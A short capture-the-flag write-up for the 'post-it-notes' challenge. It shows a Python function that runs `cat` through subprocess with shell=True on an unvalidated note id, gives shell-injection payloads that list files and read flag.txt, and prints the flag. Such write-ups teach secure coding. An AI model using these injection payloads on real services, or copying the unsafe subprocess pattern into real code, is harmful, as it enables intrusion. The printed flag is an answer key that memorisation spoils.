# post-it-notes (82 solves)

Source: [source/](./source)

Ignoring the questionable quality of the code, close analysis reveals an exploitable function:

```python
def get_note(nid):
    stdout, stderr = subprocess.Popen(f"cat 'notes/{nid}' || echo it did not work btw", shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE).communicate()
    if stderr:
        print(stderr) # lemonthink
        return {}
    return {
        'success' : True,
        'title' : nid,
        'contents' : stdout.decode('utf-8', errors = 'ignore')
    }
```

`nid` is directly passed into this function from the web server code without any validation. This means that we can do command injection by appending commands to the end of a valid note url(which depends on your server instance).

`';ls '.` reveals the presence of a `flag.txt` file, which we can then read.

Final Exploit: `';cat 'flag.txt`

Flag:flag{y0u_b3tt3r_n0t_m@k3_m3_l0s3_my_pyth0n_d3v_j0b}
